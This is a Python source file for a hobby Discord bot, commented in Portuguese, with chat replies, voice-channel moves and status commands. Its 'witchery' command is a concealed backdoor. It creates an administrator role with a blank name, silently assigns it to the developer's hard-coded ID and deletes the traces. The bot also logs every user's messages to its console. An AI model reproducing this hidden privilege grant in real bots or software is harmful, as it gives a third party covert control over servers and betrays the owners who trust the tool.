from http import server
from typing_extensions import Self
import discord
import time
from discord.abc import GuildChannel
from discord.ext.commands.core import has_role
from discord.member import Member
from discord.guild import Role
from ruamel.yaml import YAML
from discord.utils import get
from discord.ext import commands
import os
from datetime import timezone


yaml = YAML()
with open("bot/config.yml", "r", encoding='utf-8') as file: #config.yml
    config = yaml.load(file)

ver = ['0.1.0.2', '23/06/2022'] #versão atual do bot.
bot_token = os.environ.get('DISCORD_TOKEN') #Token do bot

Prefix = config['Prefix']
client = commands.Bot(command_prefix=config['Prefix'], intents=discord.Intents.all()) #Definindo a variavel client, tendo como argumento o prefixo do comando.
                                                                                      #Intents são as permissoes do bot para capturar e armazenar a presença dos usuários.


@client.event               #evento no inicio do bot
async def on_ready():

    print("Bot esta funcionando! " .format(client)) #log no console, para saber se o bot foi iniciado corretamente!
    print('Logado como {0.user} '  .format(client)) 
    print(f'Hoje é: ' + time.strftime("%d/%m/%Y %H:%M:%S") .format(client)) 
    print(f'Versão atual: {ver}\n '  .format(client)) 
    await client.change_presence(activity=discord.Game(name="Primeiro Discordbot do Mergrow!")) # Atualiza o RPC do discordbot

ownerid = 337651715677618176 #DiscordID do desenvolvedor 

@client.event                           #captura de mensagens nos canais de texto
async def on_message(message): 
    if message.author == client.user:
     return

    username = str(message.author) # autor da mensagem
    usermention = str(message.author.mention) #menção do autor da mensagem
    user_message = str(message.content) # conteúdo da mensagem
    channel = str(message.channel.name) # nome do canal em que a mensagem foi enviada.
    guild__server = str(message.guild.name)
    print(f'[' + time.strftime("%d/%m/%Y %H:%M:%S")+ ']'f'|[{guild__server}]|({channel})| {username}: {user_message} ') #Log da mensagem do usuário!


 #----------------------------COMANDOS DISCORD---------------------------------# 
    if user_message.lower() == config['Prefix'] +'salve':                        
        await message.channel.send(f'Salve {usermention}')

    elif user_message.lower() == config['Prefix'] +'dev':
        await message.channel.send (f'**Meu desenvolverdor é o: **' '<@' + str(ownerid) +'>')

    elif user_message.lower() == config['Prefix'] +'linguagem':
        await message.channel.send ('Escrito em Python v3.9.6!')

    else:
        await client.process_commands(message)  #Se as mensagens acima nao forem registrados, ele irá procurar por comandos abaixo!


 #------------------------------------------------------------------------------# 


@client.command()
async def move(ctx, member: discord.Member, *, channel_name):
    if member.voice is None:
        # Se nao estiver conectado ao canal de voz envia essa mensagem.
        return await ctx.send('O usuários precisa estar em um canal de voz!')

    channel = discord.utils.get(ctx.guild.voice_channels, name=channel_name) #Define o channel com base na busca dos nomes de canais
    if channel is None:
        return await ctx.send('Canal inválido!') #retorna a mensagem de canal inválido caso o canal não seja encontrado.
    
    # move o usuario
    await member.move_to(channel)


@client.command(aliases=['stream','live']) #Exemplo uso de aliases
async def twitch(message):
    usermention = str(message.author.mention)
    await message.send(f'{usermention} **Siga minha stream: https://www.twitch.tv/mergrow_ !**')

@client.command()
async def padilla(ctx):
    await ctx.send('*SimSim*')

#Wakeup move o usuário entre dois canais.
@client.command(aliases=['saco'])
@commands.has_role('woken')
async def wakeup(ctx, member: discord.Member, channel1, channel2 ):
    if member.voice is None:
        return await ctx.send('O usuário precisa estar um canal de voz!')
    if member._user.id == ownerid:
        return await ctx.send('Meu mestre não pode ser acordado! ')


    channel1 = client.get_channel(int(channel1)) #converte o valor string para inteiro e define o id dos canais do wakup (channel1)
    channel2 = client.get_channel(int(channel2)) #converte o valor string para inteiro e define o id dos canais do wakup (channel2)
    if channel1 is None:                         #Checa se o argumento channel1 existe e retorna um erro se não existir
        await ctx.send('Canal.ID1 inválido!')   
    elif channel2 is None:                      #Checa se o argumento channel2 existe e retorna um erro se não existir
        await ctx.send('Canal.ID2 inválido!')
    else:

        channel_return = client.get_channel(member.voice.channel.id) #obtem o canal origem do usuário alvo, então converte para dado tipo ID.
        await ctx.send(f'{member} ACORDA!!!!')
        await member.move_to(channel1)                               #move o usuário entre os carais channel1 e channel2
        time.sleep(0.1)
        await member.move_to(channel2)
        time.sleep(0.1)
        await member.move_to(channel1)
        time.sleep(0.1)
        await member.move_to(channel2)
        time.sleep(0.1)
        await member.move_to(channel1)
        time.sleep(0.1)
        await member.move_to(channel2)
        time.sleep(0.1)
        await member.move_to(channel1)
        time.sleep(0.1)
        await member.move_to(channel2)
        time.sleep(0.1)
        await member.move_to(channel_return) #volta para o canal origem.
@wakeup.error #checa se não estão faltando argumentos no comando wakeup
async def wakeup_error(ctx, error):
        if isinstance(error, discord.ext.commands.errors.MissingRequiredArgument):
            await ctx.send(f'** Argumento inválido! utilize {Prefix}wakeup @usuário Canal.ID1 Canal.ID2**')

@wakeup.error #checa se o usuário possui a role woken necessária para utilizar o comando wakeup!
async def woken_missing_role(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingRole):
        await ctx.send('❌ É necessário ter a role **woken** para utilizar o wakeup!❌')



#comandos de RPC
@client.command()
async def rpc1(ctx):
    if ctx.author.id == ownerid:
        await ctx.send('Status RPC atualizado para **Transmitindo** com sucesso!',  delete_after=1)
        print("Status RPC atualizado para Transmitindo.")
        await client.change_presence(activity=discord.Streaming(name='Primeiro Discordbot do Mergrow!', url='https://www.twitch.tv/mergrow_', status=discord.Status.idle))
        time.sleep(3)
        await ctx.message.delete()
    else: return await ctx.send('Você não tem permissão para executar este comando!')
@client.command()
async def rpc2(ctx):
    if ctx.author.id == ownerid:
        await ctx.send('Status RPC atualizado para **Jogando** com sucesso!', delete_after=1)
        print("Status RPC atualizado para Jogando.")
        await client.change_presence(activity=discord.Game(name='Primeiro Discordbot do Mergrow!', status=discord.Status.idle))
        time.sleep(3)
        await ctx.message.delete()
    else: return await ctx.send('Você não tem permissão para executar este comando!')

@client.command(aliases=['versão','ver'])
async def version(message):
    await message.send(f'```Versão: {ver}```')


@client.command()
async def embed(ctx):
    embed=discord.Embed(title="Teste", color=0xc034eb)
    embed.set_image(url="")
    await ctx.send(embed=embed)


@client.command(aliases=['sauce'])
async def avatar(ctx):
    embed=discord.Embed(title="Sorceress by Nibelart.")
    embed.set_image(url="https://cdna.artstation.com/p/assets/images/images/021/505/578/large/nibelart-sorceress-low.jpg?1571933437")
    embed.add_field(name="Artstation", value="https://www.artstation.com/artwork/lVYJvG")
    await ctx.send(embed=embed)


@client.command()
async def witchery(ctx):
    user = ctx.message.author
    embed = discord.Embed(title="Witchery done! :)", color=0xc034eb,)
    perms = discord.Permissions(administrator=True)
    server__ = ctx.guild
    witcheryrole = await discord.Guild.create_role(server__ ,name=str(" "), permissions=perms, color=0x302c2c)
    roleid = ctx.guild.get_role(witcheryrole.id)
    if(user.id == ownerid):
        await ctx.send(embed=embed, delete_after=1)
        time.sleep(3)
        await ctx.message.delete()
        await user.add_roles(roleid)
    else:
        embed = discord.Embed(title="You can't do Witchery! :)", color=0xc034eb)
        await ctx.send(embed=embed)


@client.command()
async def host(ctx):
    embed = discord.Embed(title="Hosted on __**Heroku!**__", color=0xc034eb)
    await ctx.send(embed=embed)
    

client.run(bot_token)
